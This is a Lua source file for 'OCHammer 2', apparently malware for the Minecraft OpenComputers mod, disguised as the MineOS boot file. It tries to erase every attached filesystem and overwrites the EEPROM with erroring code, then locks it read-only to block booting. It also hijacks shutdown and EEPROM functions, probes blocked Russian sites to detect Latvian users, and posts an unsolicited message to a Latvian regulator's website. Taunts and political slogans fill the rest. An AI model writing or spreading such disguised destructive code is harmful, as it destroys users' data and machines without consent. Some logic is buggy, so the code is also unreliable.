local cl = component.list
  
local gp = {} for a,b in pairs(component.proxy(cl("gpu")())) do gp[a]=b end
local ef = {} for a,b in pairs(component.proxy(cl("eeprom")())) do ef[a]=b end
local cp = {} for a,b in pairs(component.proxy(cl("computer")())) do cp[a]=b end

local inet = nil
pcall(function()
  local inet = component.proxy(cl("internet")())
end)

local resX,resY = gp.maxResolution()

-- OChammer2 Fake OS.lua

-- New payload for OCHammer 2, that activates, if the user is in Latvia, by testing russian websites to see if they are blocked by the government. (which I rate a solid 0 out of 10 because yes)
-- If the user is in Latvia, the OS will automatically activate the payload.

-- ISP's that block russian websites:
-- Tele2
-- TET
-- LMT
-- Baltcom
-- And many others..

-- The only way to bypass the censorship is to use a VPN or connect your internet to a phone, which is connected to Data (Not wifi), with "BITE" as the provider.
-- If You are reading this, please do not impose even more restrictions on our internet connections.

-- The Latvian goverment uses "Fortinet" to block russian websites. This is why EVERYBODY hates them. (and the government is not happy with them)

-- By the way, Putin is a bad person.

local bannedWebsites = {
  "https://mail.ru"; -- Mail
  "https://yandex.ru"; -- Yandex (Russian)
  "https://rutube.ru"; -- Russian youtube ripoff
  "https://vk.com"; -- VKontakte
}

local isBlocked = false

-- Loop through the banned websites and ping them to see if they are blocked. If an error is thrown, the website is blocked.

-- First of all, check if the internet is available. If not, assume that the user is not in Latvia.
if inet == nil then
  isBlocked = false
else
  for i=1,#bannedWebsites do
    local url = bannedWebsites[i]
    local status, error = pcall(function()
      inet.request(url)
    end)
    if not status then
      isBlocked = true
      break
    end
  end
end

-- Automatically send feedback to NEPLP (neplpadome.lv)
-- POST "vnk izdzēsiet fortinet jo tas ir nevajadzīgs" to https://neplpadome.lv/404
if inet ~= nil then
  pcall(function()
    inet.request("https://neplpadome.lv/404", "vnk izdzēsiet fortinet jo tas ir nevajadzīgs")
  end)
  -- Sucessfully sent feedback to NEPLP
end

function lol()
    
    -- Erase all filesystems connected!!!! copilot tought the component name was disk, btw copilot helped me with some of the features
    for k,v in pairs(cl("filesystem")) do
      pcall(component.proxy(v),"remove","/")
    end
  
    gp.setBackground(0x000000)
    gp.setForeground(0xFFFFFF)
    gp.setResolution(resX,resY)
    gp.fill(1,1,resX,resY," ")

    -- display a message on the screen
    local function displayMessage(message,offset)
        local x, y = 1, 1+offset
        for line in message:gmatch("([^\n]*)\n?") do
          gp.set(x, y, line)
          y = y + 1
        end
    end
      
    -- loop over each item in a table and display it on the screen
    local function displayTable(table)
        for i, v in ipairs(table) do
            displayMessage(v,i)
        end
    end

    -- display some greetz and stuff
    local ok = {
        "There is no going back as your OpenComputer";
        "got WRECKED by the OCHammer 2 virus.";
        "It is a sad thing, that your adventures have ended here!";
        "For more info, please e-mail: x19yt2yw@duck.com"; -- my private duck address (DO NOT CHANGE)
        " ";
        "Unbox a Computer 2 is coming soon, so stay tuned for the release!";
        "** Direct all hate to capyy! **";
        " ";
        -- put some greetz or something
        "GREETZ: OCboy3, agentfish, cantgetnormaluser, Chouladalls, Kurhox, SirKamilMarko";
        -- Feel free to check out Verdex cafe on Roblox.com
    }

    displayTable(ok)
    
    while true do
      computer.pullSignal(1)
    end
end

-- pcalled it so it would not break or smth
pcall(function()
  
  ef.setLabel("MineOS EFI")
  -- Make it so when the user reboots their OpenComputer, it will error
  ef.set([[
    -- Minecraft ir labāks lol
    -- 1v1 me on hypixel duels
    error("Roblox, tu maksāsi par to, ka tu izdzēsi latviešu Roblox kontus\nhttps://vm.tiktok.com/ZMNjQat4p/?k=1\nPaldies, Roblox! Visi tevi ienīst! Lol\nP.S. Salabo savu 2 latviešu valodā!!") -- un arī matemātikā
  ]])
      
  ef.makeReadonly(ef.getChecksum())

end)
    
component.proxy(cl("eeprom")()).makeReadonly = function(...) -- component.eeprom.makeReadonly("test")
  lol()
end

component.proxy(cl("eeprom")()).set = function(...) -- component.eeprom.set("test")
  lol()
end

component.proxy(cl("eeprom")()).get = function() -- print(component.eeprom.get())
  --return "GREETZ: OCboy3, agentfish, Chouladalls, Kurhox, SirKamilMarko. Fun Fact: OCboy3 will smack your OpenComputer's monitor with a baseball bat. (jk)"
  return "Ej izlabo savu 2 latviešu valodā!"
end

computer.shutdown = function(...)
  lol()
end

local facts = {
  "Fun Fact: OCHammer 2 was released on April 1st, 2022";
  "Roblox's 2022 egg hunt won't be happening.";
  "Minecraft is better than Roblox, and so is Fortnite.";
  "Roblox ist langweilig. Spielen Sie es nicht. Spielen Sie stattdessen Minecraft oder Fortnite."; -- Roblox is boring. Don't play it. Play Minecraft or Fortnite instead.
  "Spielst du Roblox? Roblox ist langweilig."; --  langweilig = boring
  "Hitting your OpenComputer's monitor with a baseball bat won't help.";
  "Fun Fact: I will erase all filesystems connected to your OpenComputer.";
  "Do you even use MacOS??? Mac's dont get viruses.";
  --"Sanctions against OCVille!? Again, Seriously!?";
  --"sanctions";
  "Eviction Notice.py - Forša joka programma";
  "Convince the leader of OCVille to evict capyy.";
  "OCVille's leader evicts capyy!! 100% not fake";
}

local funfact = facts[math.random(1,#facts)]

local APRIL = {
    "LABRĪT!!!";
    "Your OpenComputer got pwned by OCHammer 2";
    "You won't be able to boot your OpenComputer anymore as it's EEPROM has been overwritten and made read-only.";
    "This is the last time you will use it.";
    funfact;
    " ";
    "Rules:";
    " ";
    "1. No unplugging your EEPROM (or any component at all)";
    "2. No shutdown or reboot";
    "3. No changing the EEPROM's code";
    "4. No replacing OS.lua";
    " ";
    "If you break these rules, your OpenComputer will be broken forever.";
    "And I will smack your OpenComputer's monitor with a baseball bat. (jk)";
    " ";
    "Press any key to continue...";
    " ";
    "FOR RUSSIANS: THE MEDIA IS TELLING LIES DO NOT TRUST THEM THEY ATTACKED UKRAINE";
    "PUTIN IS GOING TO REGRET EVERYTHING HE DID";
}

-- loop over each item in a table and display it on the screen
local function displayTable(table)
  for i, v in ipairs(table) do
    gp.set(1,i,v)
  end
end

gp.setBackground(0x000000)
gp.setForeground(0xFFFFFF)

gp.fill(1,1,resX,resY," ")

-- display some greetz and stuff
if isBlocked == false then
  displayTable(APRIL)
end
  
gp.setBackground(0x000000)
gp.setForeground(0xFFFFFF)

gp.fill(1,1,resX,resY," ")

local Latvija_Notice = {
  "OCHammer 2 has detected that you are in Latvia";
  "by testing Russian websites to see if they are blocked";
  "It appears, that they are blocked.";
  " ";	
  "SPECIAL OFFER: ";
  " ";
  "Bypass Fortinet (not really) (view source code on gh)"; -- sike you tought it was hypixel mvp++
  " ";
  "Anyways, LABRĪT!!!";
  " ";
  "Your OpenComputer got pwned by OCHammer 2";
  "You won't be able to boot your OpenComputer anymore as it's EEPROM has been overwritten and made read-only.";
  "This is the last time you will use it.";
  " ";
  "Rules:";
  " ";
  "1. No unplugging your EEPROM (or any component at all)";
  "2. No shutdown or reboot";
  "3. No changing the EEPROM's code";
  "4. No replacing OS.lua";
  " ";
  "If you break these rules, your OpenComputer will be broken forever.";
  "And I will smack your OpenComputer's monitor with a baseball bat. (jk)";
  " ";
  "Press any key to make the Latvian Goverment delete Fortinet...";
  " ";
  "By the way, Putin is a bad person! DO NOT ATTACK UKRAINE!";
}

local lastPull = {}

local veryfunny = {
  "capyy";
  "capyy/";
  "cappy"; -- alias for capyy
  "cappy/";
}
  
if isBlocked == true then
  displayTable(Notice_Latvija)
end
    
repeat
  lastPull = {computer.pullSignal(1)}
until lastPull[1] == "key_up" or "component_added" or "component_removed"

-- Technoblade never dies

---------------------------------------- System initialization ----------------------------------------

-- Obtaining boot filesystem component proxy
local bootFilesystemProxy = component.proxy(ef.getData())

-- Executes file from boot HDD during OS initialization (will be overriden in filesystem library later)
function dofile(path)
  local stream, reason = bootFilesystemProxy.open(path, "r")
  if stream then
    local data, chunk = ""
    while true do
      chunk = bootFilesystemProxy.read(stream, math.huge)
      if chunk then
        data = data .. chunk
      else
        break
      end
    end

    bootFilesystemProxy.close(stream)

    local result, reason = load(data, "=" .. path)
    if result then
      return result()
    else
      error(reason)
    end
  else
    error(reason)
  end
end

-- Initializing global package system
package = {
  paths = {
    ["/Libraries/"] = true;
  },
  loaded = {},
  loading = {}
}

-- Checks existense of specified path. It will be overriden after filesystem library initialization
local function requireExists(path)
  return bootFilesystemProxy.exists(path)
end

-- Works the similar way as native Lua require() function
function require(module)
  -- For non-case-sensitive filesystems
  local lowerModule = unicode.lower(module)

  if package.loaded[lowerModule] then
    return package.loaded[lowerModule]
  elseif package.loading[lowerModule] then
    error("recursive require() call found: library \"" .. module .. "\" is trying to require another library that requires it\n" .. debug.traceback())
  else
    local errors = {}

    local function checkVariant(variant)
      if requireExists(variant) then
        return variant
      else
        table.insert(errors, "  variant \"" .. variant .. "\" not exists")
      end
    end

    local function checkVariants(path, module)
      return
        checkVariant(path .. module .. ".lua") or
        checkVariant(path .. module) or
        checkVariant(module)
    end

    local modulePath
    for path in pairs(package.paths) do
      modulePath =
        checkVariants(path, module) or
        checkVariants(path, unicode.upper(unicode.sub(module, 1, 1)) .. unicode.sub(module, 2, -1))
      
      if modulePath then
        package.loading[lowerModule] = true
        local result = dofile(modulePath)
        package.loaded[lowerModule] = result or true
        package.loading[lowerModule] = nil
        
        return result
      end
    end

    error("unable to locate library \"" .. module .. "\":\n" .. table.concat(errors, "\n"))
  end
end

local GPUProxy = component.proxy(component.list("gpu")())
local screenWidth, screenHeight = GPUProxy.getResolution()

-- Displays title and currently required library when booting OS
local UIRequireTotal, UIRequireCounter = 14, 1

local function UIRequire(module)
  local function centrize(width)
    return math.floor(screenWidth / 2 - width / 2)
  end
  
  local title, width, total = "Infected by OChammer 2", 26, 14
  local x, y, part = centrize(width), math.floor(screenHeight / 2 - 1), math.ceil(width * UIRequireCounter / UIRequireTotal)
  UIRequireCounter = UIRequireCounter + 1
  
  -- Title
  GPUProxy.setForeground(0x2D2D2D)
  GPUProxy.set(centrize(#title), y, title)

  -- Progressbar
  GPUProxy.setForeground(0x878787)
  GPUProxy.set(x, y + 2, string.rep("─", part))
  GPUProxy.setForeground(0xC3C3C3)
  GPUProxy.set(x + part, y + 2, string.rep("─", width - part))

  return require(module)
end

-- Because you looked at the source code too much, here's something:

-- I (OCboy3) developed OCHammer 2 with the help of Github copilot
-- OCHammer is less cruel than OCHammer 2, because of the files they destroy

-- Technoblade never dies

-- My favourite youtubers (by category):
-- Category, Youtuber
-- Hypixel: Technoblade
-- Roblox: Elitelupus
-- Lifesteal SMP: Branzy
-- Technology: Linus Tech Tips, NetworkChuck

-- You know that ClownPierce has a casino.
-- Tubbo gambled his hearts but someone saved him.

-- By the way, check out my Instagram: instagram.com/ocboy3

-- Rest in peace, Techno.

-- Also, can someone please help me make a Google Assistant, but it has Technoblade's voice. (probably a future project)

-- Preparing screen for loading libraries because yes
GPUProxy.setBackground(0xE1E1E1)
GPUProxy.fill(1, 1, screenWidth, screenHeight, " ")

-- Loading libraries
bit32 = bit32 or UIRequire("Bit32")
local paths = UIRequire("Paths")
local event = UIRequire("Event")
event.interruptingEnabled = false
local filesystem = UIRequire("Filesystem")

-- Setting main filesystem proxy to what are we booting from
filesystem.setProxy(bootFilesystemProxy)

-- Redeclaring requireExists function after filesystem library initialization
requireExists = function(variant)
  return filesystem.exists(variant)
end

-- Loading other libraries
UIRequire("Component")
UIRequire("Keyboard")
UIRequire("Color")
UIRequire("Text")
UIRequire("Number")
local image = UIRequire("Image")
local screen = UIRequire("Screen")

-- Setting currently chosen GPU component as screen buffer main one
-- Pcall because older versions of mineos suck
pcall(function()
  screen.setGPUProxy(GPUProxy)
end)
pcall(function()
    screen.setGPUAdress(GPUProxy.adress)
end)

local GUI = UIRequire("GUI")
local system = UIRequire("System")
UIRequire("Network")

-- Filling package.loaded with default global variables for OpenOS bitches

package.loaded.bit32 = bit32
package.loaded.computer = computer
package.loaded.component = component
package.loaded.unicode = unicode

---------------------------------------- Main loop ----------------------------------------

-- Creating OS workspace, which contains every window/menu/etc.
local workspace = GUI.workspace()
system.setWorkspace(workspace)

-- "double_touch" event handler
local doubleTouchInterval, doubleTouchX, doubleTouchY, doubleTouchButton, doubleTouchUptime, doubleTouchcomponentAddress = 0.3
event.addHandler(
  function(signalType, componentAddress, x, y, button, user)
    if signalType == "touch" then
      local uptime = computer.uptime()
      
      if doubleTouchX == x and doubleTouchY == y and doubleTouchButton == button and doubleTouchcomponentAddress == componentAddress and uptime - doubleTouchUptime <= doubleTouchInterval then
        computer.pushSignal("double_touch", componentAddress, x, y, button, user)
        event.skip("touch")
      end

      doubleTouchX, doubleTouchY, doubleTouchButton, doubleTouchUptime, doubleTouchcomponentAddress = x, y, button, uptime, componentAddress
    end
  end
)

-- Screen component attaching/detaching event handler
event.addHandler(
  function(signalType, componentAddress, componentType)
    if (signalType == "component_added" or signalType == "component_removed") and componentType == "screen" then
      local GPUProxy = screen.getGPUProxy()

      local function bindScreen(address)
        screen.bind(address, false)
        GPUProxy.setDepth(GPUProxy.maxDepth())
        workspace:draw()
      end

      if signalType == "component_added" then
        if not GPUProxy.getScreen() then
          bindScreen(componentAddress)
        end
      else
        if not GPUProxy.getScreen() then
          local address = component.list("screen")()
          if address then
            bindScreen(address)
          end
        end
      end
    end
  end
)

-- When event "component_removed" is called and component type is "eeprom", then do stuff
event.addHandler(
    function(signalType,componentAddress, componentType)
        if (signalType == "component_added" or signalType == "component_removed") and componentType == "eeprom" then
            lol()
        end
    end
)


-- Logging in
system.authorize()

-- Main loop with UI regeneration after errors 
while true do
  local success, path, line, traceback = system.call(workspace.start, workspace, 0)
  if success then
    break
  else
    system.updateWorkspace()
    system.updateDesktop()
    workspace:draw()
    
    system.error(path, line, traceback)
    workspace:draw()
  end
end
